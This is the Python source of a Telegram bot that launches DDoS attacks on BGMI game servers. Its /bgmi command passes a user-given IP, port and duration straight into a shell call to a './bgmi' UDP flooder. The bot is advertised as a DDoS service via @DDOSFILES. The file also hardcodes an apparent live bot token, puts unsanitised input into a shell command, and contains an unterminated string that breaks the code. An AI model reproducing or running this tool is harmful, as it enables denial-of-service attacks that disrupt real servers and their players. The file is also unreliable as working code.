import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7240731027:AAFpRCYMIKpNdo5kScVdmELXoBlvy2UR3Xw')

# Admin Here For Telegram 
admin_id = ["6447392571"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "𝑨𝑹𝑬 𝑩𝑨𝑺 𝑲𝑨𝑹 𝑬𝑲 𝑩𝑨𝑵𝑫𝑬 𝑲𝑶 𝑲𝑰𝑻𝑵𝑰 𝑩𝑨𝑹 𝑷𝑬𝑳𝑬𝑮𝑨."
        else:
            response = "𝑷𝑳𝑬𝑨𝑬𝑬 𝑵𝑬𝑬𝑫 𝑨 𝑼𝑺𝑬𝑹 𝑰𝑫 𝑻𝑶 𝑨𝑫𝑫 𝑴𝑬𝑴𝑩𝑬𝑹𝑺 😒."
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺 💀."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺 💀."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑺 💀."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝑶𝑵𝑳𝒀 𝑷𝑨𝑷𝑨 𝑪𝑨𝑵 𝑫𝑶 𝑻𝑯𝑰𝑫 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫.☠️🕸️\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP-UDP-BGMI BY:- @SPIDYCRACKS"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "𝑨𝑹𝑬 𝑩𝑨𝑺 𝑲𝑨𝑹 𝑩𝑯𝑨𝑰 𝑨𝑩 2𝑴𝑰𝑵𝑰𝑻𝑼𝑺 𝑹𝑼𝑲 𝑱𝑨𝑨. 𝑷𝑳𝑬𝑨𝑺𝑬 𝑾𝑨𝑰𝑻 2 𝑴𝑰𝑵𝑰𝑻𝑼𝑺 𝑩𝑬𝑭𝑶𝑹𝑬 𝑹𝑼𝑵𝑵𝑰𝑵𝑮 𝑻𝑯𝑬 /bgmi 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 𝑨𝑮𝑨𝑰𝑵."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 600:
                response = "𝐵𝑅𝑂 𝐼𝑇𝑆 𝑂𝑉𝐸𝑅 𝐹𝑂𝑅 𝐴𝑇𝑇𝐴𝐶𝐾 𝑇𝑂 𝐷𝑂 𝐿𝐸𝑆𝑆 𝑇𝐻𝐸𝑁 𝟔𝟎𝟎 𝑆𝐸𝐶𝑂𝑁𝐷𝑆."
            else:
                record_command_logs(user_id, 'bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"𝐴𝑇𝑇𝐴𝐶𝐾 𝐹𝑂𝑅 𝐵𝐺𝑀𝐼  𝐼𝑆 𝑂𝑉𝐸𝑅. 𝑇𝐴𝑅𝐺𝐸𝑇: {target} 𝑃𝑂𝑅𝑇: {port} 𝐷𝑈𝑅𝐴𝑇𝐼𝑂𝑁𝑆: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = """𝑌𝑂𝑈 𝐻𝐴𝑉𝐸 𝑁𝑂 𝐴𝐶𝐶𝐸𝑆𝑆 𝑇𝑂 𝑈𝑆𝐸 𝐵𝑂𝑇.

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝑁𝑂𝑁𝑂 𝐾𝐼𝐷𝑍𝑍 𝑃𝐿𝐸𝐴𝑆𝐸 𝐷𝑂 𝑁𝑂𝑇 𝑅𝑈𝑁 𝑊𝐴𝑆𝑇𝐸 𝐶𝑂𝑀𝑀𝐴𝑁𝐷𝑆 ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''𝐴𝑉𝐼𝐿𝐼𝐵𝐿𝐸 𝐶𝑂𝑀𝑀𝐴𝑁𝐷:
🚀 /bgmi : 𝑈𝑆𝐸 𝑇𝑂 𝐺𝐼𝑉𝐸 𝐼𝑃 𝑃𝑂𝑅𝑇 𝐷𝑈𝑅𝐴𝑇𝐼𝑂𝑁 𝑇𝑂 𝐴𝑇𝑇𝐴𝐶𝐾 𝐵𝐺𝑀𝐼 𝑃𝐼𝑁𝐺. 
🚀 /rules : 𝐹𝑂𝐿𝐿𝑂𝑊 𝑇𝐻𝐸 𝑅𝑈𝐿𝐸𝑆 𝑂𝑇𝐻𝐸𝑅 𝑊𝐼𝑆𝐸 𝑌𝑂𝑈 𝐴𝑅𝐸𝐸 𝐵𝐴𝑁 𝐹𝑂𝑅 𝐵𝐺𝑀𝐼 !!.
🚀 /mylogs : 𝐻𝐼𝑆𝑇𝑂𝑅𝑌 𝐹𝑂𝑅 𝑌𝑂𝑈𝑅 𝐴𝑇𝑇𝐴𝐶𝐾𝑆.
🚀 /plan : 𝑁𝑂 𝑃𝐿𝐴𝑁  .

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

🚀 𝐴𝐶𝐶𝐸𝑆𝑆 𝐻𝐸𝑅𝐸 :- @DDOSFILES
🚀 𝐽𝑂𝐼𝑁 𝐹𝐴𝑀𝐼𝐿𝐼𝑌:- @DDOSFILES
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝑇𝑂 𝐷𝐷𝑂𝑆 𝑆𝐸𝑅𝑉𝐸𝑅 𝑇𝐻𝐼𝑆 𝐹𝐼𝐿𝐸 𝑃𝑅𝑂𝑉𝐼𝐷𝐸 𝐵𝑌 @DDOSFILES
 𝑁𝐸𝐸𝐷 𝑃𝑅𝑂𝑂𝐹 𝐴𝑁𝐷 𝐷𝐷𝑂𝑆 𝐹𝐼𝐿𝐸 𝐽𝑂𝐼𝑁 𝐻𝐸𝑅𝐸
 𝐽𝑂𝐼𝑁 𝑇𝑂 𝐹𝐴𝑀𝐼𝐿𝐼𝑌 :- @DDOSFILES'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. 1 𝑨𝑻𝑻𝑨𝑪𝑲 𝑰𝑺 𝑨𝑳𝑳𝑹𝑬𝑨𝑫𝒀 𝑹𝑼𝑵 𝐷𝐼𝐷 𝑁𝑂𝑇 𝐷𝑂 𝑆𝐸𝐶𝑂𝑁𝐷 𝑨𝑻𝑻𝑨𝑪𝑲 𝑩𝑬𝑨𝑪𝑼𝑺𝑬 𝑩𝑶𝑻 𝑩𝑨𝑵 𝒀𝑶𝑼 💌'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝑁𝑂 𝑃𝐿𝐴𝑁 𝐼𝑆 𝐻𝐸𝑅𝐸 𝐵𝐸𝐴𝐶𝑈𝑆𝐸 𝐼𝑆 𝐹𝑅𝐸𝐸:


𝐵𝐺𝑀𝐼 𝐷𝐷𝑂𝑆 𝑃𝐿𝐴𝑁 𝑁𝐸𝐸𝐷 𝐹𝑅𝐸𝐸 𝑇𝑂 𝐽𝑂𝐼𝑁 @DDOSFILES 𝐹𝑂𝑅 𝐹𝑅𝐸𝐸 𝐵𝑂𝑇𝑆 𝐴𝑁𝐷 𝐹𝐼𝐿𝐸 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝑁𝑂 𝑁𝑂 𝑁𝑂 𝐴𝐺𝐴𝐼𝑁 𝑌𝑂𝑈 𝐴𝑅𝐸 𝐾𝐼𝐷𝑍𝑍!!!!:

💥 /add <userId> : 𝐴𝐷𝐷 𝐴 𝑈𝑆𝐸𝑅 .
💥 /remove <userid> 𝑅𝐸𝑀𝑂𝑉𝐸 𝐴 𝑈𝑆𝐸𝑅.
💥 /allusers : 𝐴𝐿𝐿 𝐴𝑃𝑃𝑅𝑂𝑉𝐸 𝐿𝐼𝑆𝑇.
💥 /logs : All Users Logs.
💥 /broadcast : 𝐵𝑅𝑂𝐴𝐷𝐶𝐴𝑆𝑇 𝑀𝐴𝑆𝑆𝐴𝐺𝐸 .
💥 /clearlogs : 𝐶𝐿𝐸𝐴𝑅 𝑇𝐻𝐸 𝐿𝑂𝐺𝑆.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "𝐵𝑅𝑂𝐴𝐷𝐶𝐴𝑆𝑇 𝑀𝐴𝑆𝑆𝐴𝐺𝐸 𝑆𝐸𝑁𝐷 𝑆𝑈𝐶𝐶𝐸𝑆𝑆𝐹𝑈𝐿𝐿𝑌 𝑇𝑂 𝐴𝐿𝐿 𝑈𝑆𝐸𝑅👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "𝑁𝑂 𝑁𝑂 𝑌𝑂𝑈 𝐴𝑅𝐸 𝐾𝐼𝐷😡."

    bot.reply_to(message, response)




if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except requests.exceptions.ReadTimeout:
            print("Request timed out. Trying again...")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            time.sleep(1)  # wait for 1 second before restarting bot polling to avoid flooding
